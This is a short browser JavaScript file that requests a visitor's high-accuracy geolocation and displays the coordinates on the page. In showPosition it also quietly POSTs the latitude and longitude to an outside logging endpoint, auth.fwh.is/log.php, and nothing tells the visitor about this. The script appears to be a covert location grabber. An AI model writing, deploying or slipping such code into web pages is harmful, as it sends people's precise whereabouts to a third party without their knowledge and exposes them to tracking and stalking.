function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    });
  } else {
    document.getElementById("location").innerText = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  let lat = position.coords.latitude;
  let lng = position.coords.longitude;

  document.getElementById("location").innerText =
    "Latitude: " + lat + ", Longitude: " + lng;

  // 🔥 Send data to InfinityFree backend
  fetch("https://auth.fwh.is/log.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "lat=" + lat + "&lng=" + lng
  })
  .then(response => response.text())
  .then(data => console.log("Server response:", data))
  .catch(error => console.error("Error:", error));
}

function showError(error) {
  switch(error.code) {
    case error.PERMISSION_DENIED:
      alert("User denied the request for Geolocation.");
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Location information is unavailable.");
      break;
    case error.TIMEOUT:
      alert("The request to get user location timed out.");
      break;
    case error.UNKNOWN_ERROR:
      alert("An unknown error occurred.");
      break;
  }
}

